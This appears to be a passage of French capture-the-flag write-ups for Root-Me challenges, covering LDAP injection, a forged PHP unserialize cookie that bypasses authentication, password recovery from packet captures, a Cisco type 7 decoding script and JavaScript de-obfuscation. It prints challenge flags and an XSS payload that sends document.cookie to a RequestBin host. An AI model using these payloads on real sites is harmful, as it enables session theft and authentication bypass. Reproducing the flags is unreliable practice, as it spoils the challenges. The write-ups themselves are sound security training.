On se rend vite compte qu’on ne peut pas mettre de commentaires pour éviter de renseigner le champ password et comme le caractère * est interdit dans le mot de passe, il faut trouver un moyen de faire sans !
J’ai donc utilisé le ! pour dire que le mot de passe de doit PAS être "toto" :
login : *)(!(&(&
pass : toto))
ce qui donne la requête : (& (uid=*) (!(&(&)(userPassword=toto)) )) renvoyant n’importe quel uid dont le mot de passe n’est pas toto.
Il ne reste ensuite plus qu’à aller chercher le mot de passe dans le code source de la page une fois connecté.

##PHP Sérialisation
La doc de php nous dit que la fonction serialize() génère une représentation stockable d’une valeur. Plus bas un lien pointant vers la fonction inverse de celle-ci unserialize()....et là :

    Warning
    Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.

Tout est clair, il faut injecter un code malicieux par là.

En regardant le code source un point d’attaque saute aux yeux :

        // autologin cookie ?
        else if($_COOKIE['autologin']){
            $data = unserialize($_COOKIE['autologin']);


Il faudra donc forger un cookie de session pour bypasser l’authentification qui se jouera ici :

        // check password !
        if ($data['password'] == $auth[ $data['login'] ] ) {


Toutefois, celà ne va pas être trop compliqué puisque le développeur utilise l’opérateur de comparaison "Equal" de php " == " qui a un laxisme dans la vérification des données c’est à dire qu’elle vérifie uniquement si les deux opérandes ont la même valeur sans vérifier le type de ces opérandes. A ce propos, il est recommandé d’utiliser l’opérateur de comparaion "Identical" de php " === " qui vérifie à la fois la valeur et le type de données des opérandes.

Exemple :

    <?php
     
    $sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
     
    $e = array("login"=> "superadmin", "password"=> 0);
     
    if( $e['password'] == $sha256){
    echo "ok flag le maintenant";
    echo '</br></br>';}
     
    echo serialize($e);
     
    echo '</br></br>';
     
    echo urlencode(serialize($e));
    ?>


Avec ce bout de code on peut comprendre le fonctionnement de Equal " == "
Si la valeur de $e[’password’] est un entier (ici 0) et que le premier caractère du hash est un char, alors on bypass l’authentification puisque la convertion ne peut se faire (string -> int) donc le char donne un 0 et donc qual retourne "true".

Sinon, si Equal renvoie "false" celà veut dire que le premier caractère du hash est un entier.
Du coup on n’as plus qu’as brute-forcer de 1 à 9.

La première tentative de brute-force est injecté avec succès avec un 1 :

    <?php
    $e = array("login" => "superadmin", "password" => 1);
    echo serialise($e);
    echo '</br></br>';
    echo urlencode(serialize($e));
    ?>


valeur sérialisée : a:2:{s:5:"login";s:10:"superadmin";s:8:"password";i:1;}
     
valeur encodé : a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bi%3A1%3B%7D


Avec le greffon firefox "http live headers", on rejoue en prenant soin d’insérer le cookie ainsi :
Cookie: spip_session=[ton_spip_session]; autologin =a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bi%3A1%3B%7D

Et voilà le flag de validation !

#########
RESEAU
==
#########

##FTP - Authentification
- Solution1
Dans Wireshark : Clic droit/Follow TCP Stream

Le protocole Telnet ne chiffre pas les mots de passe, ils apparaissent en clair, c’est la raison pour laquelle FTP est de moins en moins utilisé.
**solution2
Le protocole FTP précise que pour envoyer le mot de passe, il faut envoyer la chaîne sous la forme : PASS

"PASS" en hexa vaut "50 41 53 53 20".

Dans le fichier pcap, cherchez donc la chaîne hexa "5041535320". A partir de là, le mot de passe commence et se termine pas CRLF ("0x0D0A"). On trouve donc la chaîne "6364747333353030" qui en ASCII vaut "cdts3500"
##TELNET - authentification
Préliminaires :

Une capture, un nom de protocole et un mot de passe à récupérer. Rien de plus simple. On nous donne même en ressource, les specs du protocole Telnet.

-Attaque :
On récupère la capture et on l’ouvre avec Wireshark. On voit un échange bien bordélique entre 2 machines. Les 3 premiers segments TCP nous montre qu’il y a ouverture de connexion, grâce aux bytes : SYN, SYN/ACK, ACK. Les informations de connexions ne doivent donc pas être très loin.

Et pour se faciliter la chose, WireShark intègre une option, qui ici, va nous être super utile : le "Follow TCP Stream". 
Pour ça on fait un clic droit sur une de nos trames, on cherche l’option en question, et on clic dessus. 
Une chouette boite de dialogue s’ouvre, avec le texte suivant :
........... ..!.."..'.....#..%..%........... ..!..".."........P. ....".....b........b.....B.
........................"......'.....#..&..&..$..&..&..$.. .....#.....'........... .9600,9600....#.bam.zing.org:0.0....'..DISPLAY.bam.zing.org:0.0......xterm-color.............!.............."............

OpenBSD/i386 (oof) (ttyp1)

login: .."........"ffaakkee
.
Password:user
.
Last login: Thu Dec  2 21:32:59 on ttyp1 from bam.zing.org
Warning: no Kerberos tickets issued.
OpenBSD 2.6-beta (OOF) #4: Tue Oct 12 20:42:32 CDT 1999
(Pour plus de facilité de lecture, je n’ai pas tout recopié).

La à moins d’être aveugle, on voit très nettement le pass de l’utilisateur : "user". On test, effectivement ça valide l’épreuve.

Flag du challenge : user.
                
##ETHERNET - trame
Il suffit de copier le contenu hexa dans un fichier "pcap.hex"
Il faut bien spécifier le format avec le numéro des octets :
000000 00 05 73 a0 00 00 e0 69
............................................
0000B8 3a 20 2a 2f 2a 0d 0a 0d
0000C0 0a

La commande :  text2pcap pcap.hex pcap.pcap

Et voilà on a un fichier lisible par wireshark avec la chaine suivante : Y29uZmk6ZGVudGlhbA==

Elle se décode en base64 : confi:dential
    
##Authentification twitter
quand on observe le document du challenge une ligne en particulier retient l’attention :
"Authorization: Basic dXNlcnRlc3Q6cGFzc3dvcmQ="

Une rapide recherche sur internet avec les mots clés "Authorization : Basic" nous apprend ceci :

    When the user agent wants to send the server authentication credentials it may use the Authorization header.[5]
    The Authorization header is constructed as follows :[6]
    Username and password are combined into a string "username:password"
    The resulting string literal is then encoded using Base64
    The authorization method and a space i.e. "Basic " is then put before the encoded string.
    For example, if the user agent uses ’Aladin’ as the username and ’sesam open’ as the password then the header is formed as follows :
    Authorization : Basic QWxhZGluOnNlc2FtIG9wZW4=

Il ne reste donc plus qu’à ré-encoder la chaine "dXNlcnRlc3Q6cGFzc3dvcmQ=" de notre exemple de Base64 
vers ASCII (http://www.hcidata.info/base64.htm par exemple) pour obtenir le login et le mot de passe, en l’occurence : password

##CISCO - mot de passe
- Solution 1

Analyse

Lorsque l’on ouvre l’épreuve, on se retrouve face à du code. En observant, on peut remarquer plusieurs choses intéressantes :
enable secret 5 $1$p8Y6$MCdRLBzuGlfOs9S.hXOp0.

username hub password 7 04785A152471735E1909
username admin privilege 15 password 7 10181A325528130F010D24
username guest password 7 124F163C42340B112F3830

password 7 144101205C3B29242A3B3C3927

Démarche

Le but de l’épreuve est de trouver le pass "Enable", donc celui ci :

enable secret 5 $1$p8Y6$MCdRLBzuGlfOs9S.hXOp0.

En faisant quelques recherches, on découvre que ce chiffrement est un md5, donc impossible à bypasser 
en dehors du bruteforce ou d’une attaque par dico. La ligne précédant ce code nous informe sur la longueur 
minimale du pass qui est de 8 caractères, beaucoup trop long pour tenter une attaque brute.

En se penchant donc sur les autres pass, on voit que la méthode de chiffrement est différente, et il est facile de 
trouver un programme online pour les décrypter. On se retrouve alors avec :

hub password = 6sK0_hub
admin password = 6sK0_admin
guest password = 6sK0_guest
password de fin = 6sK0_console

Résolution

On remarque la répétition de "6sK0_" en début de pass, on essaye alors "6sK0_enable".... Et il passe le pass !

- Solution 2
Télécharger le document qui correspond à la configuration d’un boitier Cisco.
Vous pouvez vous apercevoir alors que le mot de passe enable est encodé en type 5.
Avant de bruteforcer ce hash, interessons nous aux autres password du fichier.
Les autres sont en type 7 qui d’après la doc Cisco correspond à une obfuscation et non pas à un condensat. 
Cette obfuscation est reversible et n’est en fait qu’une série de Xor.
Utilisons le script python suivant pour retrouver les passwords :

    #!/usr/bin/python
    '''
    koma - july 2013 : decrypt cisco type 7 pass
    '''
     
    import sys
    import string
    import re
     
    cisco7 = "tfd;kfoA,.iyewrkldJKDHSUB"
     
    def cisco7decrypt(str):
      result = ""
      tab = re.findall('..', str)
      for i in range(len(tab)-1):   
        result += chr(ord(cisco7[(int(tab[0])-1+i) % len(cisco7)])^int(tab[i+1],16)) 
      print "cisco 7 encrypted: %s, unencrypted: %s" % (str, result)
     
    if len(sys.argv) <= 1:
     print "usage: %s cisco_conf" % sys.argv[0]
     exit(-1)
     
    f = open(sys.argv[1], 'r')
    for line in f:
      m = re.search("^.+password\s7\s(\w+)$", line)
      if m:
        cisco7decrypt(m.group(1))
    f.close()

Passer le fichier de configuration ch20.txt en argument.

Le script vous renvoie la sortie suivante :

cisco 7 encrypted : 04785A152471735E1909, unencrypted : 6sK0_hub
cisco 7 encrypted : 10181A325528130F010D24, unencrypted : 6sK0_admin
cisco 7 encrypted : 124F163C42340B112F3830, unencrypted : 6sK0_guest
cisco 7 encrypted : 144101205C3B29242A3B3C3927, unencrypted : 6sK0_console

On peut voir que les passwords ont un format prédéfini la chaine ’6sK0_’ (pour Cisco ?) suivi par le nom d’utilisateur.

Essayons de valider l’épreuve avec 6sK0_ena, ca ne passe pas.
Par contre, 6sK0_enable marche !

###########
STEGANOGRAPHIE
==
###########

###########
WEB-CLIENT
==
########### 

##Javascript - Authentification
Avec Firefox (19.0 personnellement) et son outil intégré pour le développement web.
Il faut ouvrir la page, lancer la console web et réactualiser la page.
On voit que la page appelle un fichier Javascript http://challenge01.root-me.org//web-client/ch9/login.js. On n’a plus qu’a visiter l’url de 
ce fichier pour en afficher le contenu.
Ce fichier nous dit :
«if (pseudo=="4dm1n" && password=="sh.org")»

- On en déduit dont que le mot de passe est : sh.org

##Javascript - Source
Pour cette épreuve il faut regarder le code source HTML de la page. On identifie un script javascript entre les balises HTML script :
<script>
[CODE Javascript]
</script>

Le mot de passe y est affiché en clair.

##Javascript - Authentification 2
Comme pour le challenge "Authentification", un simple coup d’oeil aux sources nous donne la solution :
[...]
 TheLists[0] = "CACHÉ:HIDDEN";
[...]
  var TheSplit = TheLists[i].split(":");
  var TheUsername = TheSplit[0];
  var ThePassword = TheSplit[1];
[...]

Il suffit donc de se connecter avec comme userame : CACHÉ et pass : HIDDEN

##Javascript - Obfuscation 1
Regarder les sources
pass = '%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64';
              [...]
              if(h == unescape(pass)) {
                  alert('Password accepté, vous pouvez valider le challenge avec ce mot de passe.\nYou an validate the challenge using this pass.');
              }

Il suffit alors d’ouvrir la console du naviguateur et d’y taper :

alert(unescape('%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64'))

Une fenetre s’ouvre avec le mot de passe en clair : cpasbiendurpassword

##Javascript - Obfuscation 2
En ouvrant la page du challenge on obtient une page blanche, donc un Ctrl + u pour afficher le code source.

On découvre alors que le mot de passe est présent dans ce script :

    <script type="text/javascript">
    	var pass = unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29");
    </script>


Le mot de passe à été rendu incompréhensible avec la fonction escape() du javascript qui permet de protéger les chaînes de caractères en 
encodant les caractères spéciaux. La fonction unescape() ici permet de revenir en arrière.

On descend d’un étage avec unescape() :
var pass = unescape("unescape("String.fromCharCode%28104%2C68%2C117%2C102%2C106%2C100%2C107%2C105%2C49%2C53%2C54%29")");

Il reste encore du texte a décoder, on descend d’un deuxième étage à nouveau avec unescape() :
var pass = unescape("unescape("String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54)")");

Nous voilà maintenant avec une série de chiffre :
104,68,117,102,106,100,107,105,49,53,54

Avec un peu de recherche, on découvre qu’il s’agit de la valeur décimale du tableau ascii des caractères qui composent le mot de passe.

Enfin le troisième étage, une petite substitution rapide "décimale vers char" nous donne :
var pass = unescape("unescape("String.fromCharCode(h,D,u,f,j,d,k,i,1,5,6)")");

Et voilà challenge validé

Documentation utile : http://www.asciitable.com/index/asciifull.gif

https://developer.mozilla.org/fr/docs/JavaScript_Guide/Fonctions_pr%C3%A9d%C3%A9finies/Les_fonctions_escape_et_unescape

Outil : http://www.tareeinternet.com/scripts/unescape.html

##Javascript - Native code
- Solution 1

Pour resoudre ce challenge, j’ai fait d’abord copier/coller tout le script dans la console, 
ensuite remplacer les deux dernieres parentheses qui sont a la fin du script par : .toString()

Ceci est juste la fin, mais vous devrez copier/coller tout le script :
+ó)+(ó-É)+'\\'+(þ)+(ó)+'\\'+(ó-É)+(þ)+(É+ó)+'\'')())()

Remplacer les deux dernieres parentheses par .toString() et ca donne :
+ó)+(ó-É)+'\\'+(þ)+(ó)+'\\'+(ó-É)+(þ)+(É+ó)+'\'')()).toString()

Appuyez la touche "Entree" et voila !
"function anonymous()
a=prompt(’Entrez le mot de passe’) ;if(a==’toto123lol’)alert(’bravo’) ;elsealert(’fail...’) ;
"
-Solution 2
O n utilise l’add-on Firefox "Javascript deobfuscator" lors du chargement du script.

Ni une ni deux, le flag apparait :
function anonymous() {
a=prompt('Entrez le mot de passe');if(a=='toto123lol'){alert('bravo');}else{alert('fail...');}
}

##Javascript - Obfuscation 3
Tout d’abord il faut analyser le code source pour voir les fonctions JS disponible :
On observe un appel à la fonction dechiffre() avec en paramètre une chaine en ASCII et le tout est passé en paramètre à la fonction fromCharCode() :

    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));

Lorsqu’on décode pas à pas la chaine ASCII cela donne :

\x35 = 5 en decimal
Donc \x35\x35\x2c = "55," et String.fromCharCode(55) ; = 7

En continuant sur cette logique on obtient la chaine suivante :
"55,56,54,79,115,69,114,116,107,49,50"

- En calculant :

    String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);

- On obtient "786OsErtk12" qui est le password du challenge.

##XSS - Stored 1
Une solution alternative aux autres car ne nécessitant pas de créer un script de réception ni de créer un serveur.
Le cookie est récupéré directement dans l’url qu’on construit.

Il suffit d’aller sur le site RequestBin et de faire Create a RequestBin (gratuit).

- On utilisera le lien de l’encadré pour l’attaque XSS. Le lien a la forme suivante : http://requestb.in/xxxxxxxx

Dans le formulaire du challenge on met n’importe quelle valeur pour le titre et pour le message le script suivant :
<script>document.write('<IMG SRC=\"http://requestb.in/xxxxxxxx?cookie='+document.cookie+'\">Hacked</IMG>');</script>

- On devrait voir apparaître notre requête sur l’url RequestBin qu’on a créé.
Puis après quelques minutes (messages lus par l’admin) on verra apparaître la requête faite par l’admin (penser à rafraîchir la page) :
http://requestb.in
GET /xxxxxxxx?cookie=(u'ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6',)

Le cookie pour validation est donc : NkI9qe4cdLIO2P7MIsWS8ofD6

##Javascript - Obfuscation 4
Après avoir récupéré le code source Javascript dans la page, la première chose est de réécrire le code avec des noms 
de fonctions et de variables qui vont permettre d’analyser ce qui se passe. Voici une proposition de code source modifié :

    var ciphered ="\x71\x11\x24\x59\x8d\x6d\x71\x11\x35\x16\x8c\x6d\x71\x0d\x39\x47\x1f\x36\xf1\x2f\x39\x36\x8e\x3c\x4b\x39\x35\x12\x87\x7c\xa3\x10\x74\x58\x16\xc7\x71\x56\x68\x51\x2c\x8c\x73\x45\x32\x5b\x8c\x2a\xf1\x2f\x3f\x57\x6e\x04\x3d\x16\x75\x67\x16\x4f\x6d\x1c\x6e\x40\x01\x36\x93\x59\x33\x56\x04\x3e\x7b\x3a\x70\x50\x16\x04\x3d\x18\x73\x37\xac\x24\xe1\x56\x62\x5b\x8c\x2a\xf1\x45\x7f\x86\x07\x3e\x63\x47";
     
    function xor(x, y)
    {
    	return x ^ y;
    }
     
    function Power(y)
    {
    	var z = 0;
    	for (var i = 8 - y; i < 8; i++)
    	{
    		z += Math.pow(2, i);
    	}
    	return z
    }
    function Brouille(x, y)
    {
    	y = y % 8;Ï = Power(y);Ï = (x & Ï) >> (8 - y);
    	return ((Ï) + (x << y)) & 0x00ff;
    }
    function decrypt(Chaine, key)
    {
    	Variable = "";
    	for (var i = 0; i < Chaine.length; i++)
    	{
    		c = Chaine.charCodeAt(i);
    		if (i != 0)
    		{
    			t = Variable.charCodeAt(i - 1) % 2;
    			switch (t)
    			{
    				case 0:
    					cr = xor(c, key.charCodeAt(i % key.length));
    					break;
    				case 1:
    					cr = Brouille(c, key.charCodeAt(i % key.length));
    					break;
    			}
    		}
    		else
    		{
    			cr = xor(c, key.charCodeAt(i % key.length));
    		}
    		Variable += String.fromCharCode(cr);
    	}
     
    	return Variable;
     
    }
    function main(PasseBin)
    {
    	var Compteur = 0;
    	for (var i = 0; i < PasseBin.length; i++)
    	{Compteur += PasseBin["charCodeAt"](i)
    	}
    	if (Compteur == 8932)
    	{
    		var win = window.open("", "","\x77\x69\x64\x74\x68\x3d\x33\x30\x30\x2c\x68\x65\x69\x67\x68\x74\x3d\x32\x20\x30");win.document.write(PasseBin)
    	}
    	else
    	{
    		alert("Mauvais mot de passe!");
    	}
    }
     
    main(decrypt(ciphered, prompt("Mot de passe?")));

- On remarque donc que le mot de passe à saisir est en fait la clef de déchiffrement de la chaîne en hexa que j’ai nommé ’ciphered’

La première des choses est de trouver la longueur de la clef.

Voici un extrait du texte chiffré (pos:0 -> pos:17) :
71 11 24 59 8d 6d 71  11 35 16 8c 6d  71 0d 39 47 1f  36

- On remarque la répétition du char 71 tous les 6 caractères !!!

- On prend donc l’hypothèse d’une longueur de clef de 6 chars. Elémentaire !

Ensuite, on remarque que le texte, une fois déchiffré est en fait un contenu qui sera envoyé à une fenêtre en window.open. 
Et si le contenu était du HTML ???

Nous voici donc en capacité de déchiffrer avec un mot probable de 6 lettres en début de chaîne. Ne peut on rêver meilleure situation ?
ciphered  : 71 11 24 59 8d 6d
plain text : 3c 68 74 6d 6c 3e

- On remarque que XOR est utilisé comme chiffrement pour les caractères 0, 1, 2, 3, 4

Comme l’opération XOR est transitive, on trouve facilement les 4 premiers caractères de la clef :
71 ^ 3C = 4D (M)
11 ^ 68 = 79 (y)
24 ^ 74 = 50 (P)
59 ^ 6d = 34 (4)

MyP4.... Ca me fait penser à quelque chose... Pour les 2 derniers caractères, soit vous voyez tout de suite, 
qu’il s’agit du string "mypass" en l33t, soit vous vous amusez à faire la fonction reverse de "Brouille".
Pour ma part, j’ai improvisé et trouvé la clef par déduction

And the key is....    
	
  


